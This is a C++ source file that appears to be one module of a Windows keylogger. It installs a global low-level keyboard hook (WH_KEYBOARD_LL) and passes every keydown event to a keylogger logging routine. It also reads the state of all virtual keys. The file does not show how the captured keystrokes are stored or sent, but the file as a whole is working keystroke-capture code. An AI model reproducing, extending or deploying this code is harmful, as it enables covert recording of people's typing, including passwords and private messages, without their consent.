#include "keyboard.h"
#include "keylogger.h"
#include "constants.h"
#include <cstdint>
#include <stdexcept>

// The hook variable shared between the setter and the callback.
HHOOK hook;

// The callback that is fired every time a new keyboard input event is about to be
// posted into a thread input queue.
LRESULT WINAPI hook_callback(int code, WPARAM wparam, LPARAM lparam)
{
    // If an action occurred and the keydown event was fired, log the respective 
    // characters of the KBD hook.
    if (code == HC_ACTION && wparam == WM_KEYDOWN)
    {
        keylogger::log_kbd(reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam));
    }

    return CallNextHookEx(hook, code, wparam, lparam);
}

// Sets the low level keyboard hook.
void keyboard::set_hook()
{
    hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, NULL, 0);

    if (!hook)
    {
        throw std::runtime_error{ "The low level keyboard hook could not be set." };
    }
}

// Copies the status of the 256 virtual keys to the provided buffer.
void keyboard::get_state(BYTE* keyboard_state) noexcept
{
    for (uint16_t i = 0; i < KEYBOARD_STATE_SIZE; i++)
    {
        const auto key_state = GetKeyState(i);

        // Right shifts the high order bit by 8 to avoid a narrowing conversion
        // from a SHORT to a BYTE.
        keyboard_state[i] = (key_state >> 8) | (key_state & 1);
    }
}

// Right shifts the high order bit by 15 to obtain the virtual key's up/down status.
bool keyboard::is_down(DWORD vk_code) noexcept
{
    return GetKeyState(vk_code) >> 15;
}
